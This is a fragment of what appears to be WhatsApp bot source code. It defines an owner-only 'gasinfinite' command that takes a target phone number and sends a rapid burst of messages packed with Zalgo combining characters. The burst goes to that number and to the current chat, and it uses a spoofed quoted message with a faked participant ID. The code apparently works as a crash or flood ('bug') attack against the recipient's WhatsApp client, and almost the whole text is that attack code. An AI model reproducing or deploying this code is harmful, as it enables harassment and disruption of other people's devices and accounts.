            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            freply(`SUCCES`)
            break
                   case 'gasinfinite':               
          if (!isCreator) return
          if (!text) throw `Nomernya mana?`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
